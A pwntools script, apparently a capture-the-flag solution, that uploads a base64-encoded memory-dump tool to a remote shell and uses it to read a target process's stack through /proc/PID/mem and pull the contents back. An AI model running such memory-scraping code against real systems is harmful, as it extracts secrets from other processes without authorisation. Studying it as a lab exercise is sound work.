import base64
import re
from pwn import *
context.log_level = 'debug'
io = remote("61.147.171.105", 50356)


def wait_until_input(path="/"):
    io.recvuntil((path + ' #').encode())


wait_until_input()
io.sendline(b'touch dump_stack.b64')
with open("dump_stack.b64", 'r') as f:
    b64_content = f.read()
b64_content = b64_content.replace("\n", "")

ptr = 0
while ptr < len(b64_content):
    end = ptr + 100
    if end > len(b64_content):
        end = len(b64_content)
    wait_until_input()
    io.sendline(b"echo -n " + b64_content[ptr:end].encode() + b" >> dump_stack.b64")
    ptr = end

print("Finished")
wait_until_input()
io.sendline(b"base64 -d dump_stack.b64 > dump_stack")
wait_until_input()
io.sendline(b"chmod 777 dump_stack")
wait_until_input()
io.sendline(b"ps -ef | grep './target'")
io.recvline()
target_pid = int(io.recvline()[2:5].decode())
print(target_pid)
wait_until_input()
io.sendline(b"cat /proc/" + str(target_pid).encode() + b"/maps | grep 'stack'")
io.recvline()
stack_info = io.recvline()
start_addr = int(stack_info[0:12].decode(), 16)
end_addr = int(stack_info[13:25].decode(), 16)
wait_until_input()
io.sendline(b"./dump_stack /proc/" + str(target_pid).encode() + b"/mem " + hex(start_addr)[2:].encode() + b" " + hex(end_addr).encode()[2:] + b" ./stack_info.bin")
wait_until_input()
io.sendline(b"base64 ./stack_info.bin")
io.recvline()
stack_content = io.recvuntil(b"/ # ", drop=True).decode()
stack_content = stack_content.replace("\r", "").replace("\n", "")
stack_content = base64.b64decode(stack_content)
print(stack_content)
# io.interactive()